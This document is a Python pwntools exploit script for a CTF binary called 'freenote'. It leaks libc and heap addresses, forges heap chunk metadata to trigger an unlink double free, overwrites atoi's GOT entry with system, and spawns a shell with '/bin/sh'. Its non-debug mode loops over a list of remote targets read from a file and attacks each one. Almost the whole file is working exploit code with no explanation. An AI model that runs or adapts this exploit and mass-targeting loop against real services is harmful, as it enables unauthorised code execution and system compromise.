#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1
io = None

if DEBUG: context(log_level='debug')


# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def sendflag(flag):
    pass

def new_note(size, content):
    ru(': ')
    sl('2')
    ru(': ')
    sl(str(size))
    ru(': ')
    sn(content)

def list_note():
    ru(': ')
    sl('1')

def edit_note(id, content, size):
    ru(': ')
    sl('3')
    ru(': ')
    sl(str(id))
    ru(': ')
    sl(str(size))
    ru(': ')
    sn(content)

def delete_note(id):
    ru(': ')
    sl('4')
    ru(': ')
    sl(str(id))

def leak_libc():
    size = 0x80

    new_note(size, 'a' * size)
    new_note(size, 'b' * size)

    delete_note(0)
    new_note(1, '\x58')
    list_note()
    ru('0. ')
    libc_addr = u64(rn(6).ljust(8, '\x00'))
    delete_note(1)
    delete_note(0)

    return libc_addr

def leak_heap():
    size = 0x10
    
    new_note(size, 'a' * size)
    new_note(size, 'b' * size)
    new_note(size, 'c' * size)
    new_note(size, 'd' * size)

    delete_note(2)
    delete_note(0)

    new_note(8, 'A' * 8)
    list_note()
    ru('0. AAAAAAAA')

    heap_addr = u64(ru('\x0a')[:-1].ljust(8,'\x00'))
    
    delete_note(0)
    delete_note(1)
    delete_note(3)
    return heap_addr     

def overwrite_notetable(heap_addr):
    size = 0x100
    new_note(size, 'A' * size)
    new_note(size, 'B' * size)
    new_note(size, 'C' * size)
    
    delete_note(2)
    delete_note(1)
    delete_note(0)
    
    fd = heap_addr - 0x1808
    bk = fd + 0x8
    
    payload = p64(0)
    payload += p64(1)
    payload += p64(fd)
    payload += p64(bk)
    payload += 'a' * (size - 0x20)
    payload += p64(0x100) #pre_size because we cut the pre_size and the size, so the chunk is only 0x100 big
    payload += p64(0x110) #size
    payload += 'b' * size
    payload += p64(0)
    payload += p64(0x111) #pre_inuse is 1
    payload += 'c' * (size - 0x20)

    new_note(size * 3, payload)
    #trigger double free
    delete_note(1)

# define symbols and offsets here
printf_got = 0x602030
atoi_got = 0x602070
# define exploit function here
def pwn():
    libc_addr = leak_libc()
    info('leaked libc: ' + hex(libc_addr))

    heap_addr = leak_heap()
    info('leaked heap: ' + hex(heap_addr))

    overwrite_notetable(heap_addr)
   
    edit_note(0, p64(0x100) + p64(1) + p64(0x8) + p64(atoi_got) + "a" * (0x300 - 32), 0x300)
    
    system_addr = libc_addr - 3672200
    edit_note(0, p64(system_addr), 8)

    #get shell    
    ru(': ')
    sl('/bin/sh')

    io.interactive()
if __name__ == '__main__':
    
    global io

    if DEBUG: 
	io = process('./freenote')
        #io = remote('127.0.0.1', 4000) 
	pause()
        pwn()

    else:
        f = open(sys.argv[1], 'r')
        targets = f.readlines()
        for target in targets:
            io = remote(target, int(sys.argv[2]))
            resp = pwn()
            sendflag(resp)
            exit(0)
